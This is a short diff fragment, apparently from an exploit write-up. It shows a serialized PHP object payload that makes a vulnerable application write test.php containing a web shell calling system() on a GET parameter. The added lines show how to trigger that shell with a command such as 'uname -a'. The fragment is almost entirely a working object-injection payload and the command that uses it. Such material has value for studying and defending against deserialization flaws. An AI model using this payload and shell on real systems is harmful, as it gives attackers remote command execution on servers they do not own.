@@ -51,3 +51,8 @@ O:3:"App":2:{s:7:"logfile";s:8:"test.php";s:7:"logData";s:27:"<?php system($_GET
 ```
 
 Use the payload on the vunerable endpoint
+
+Exploit
+```php
+ /test.php?c=uname -a
+```
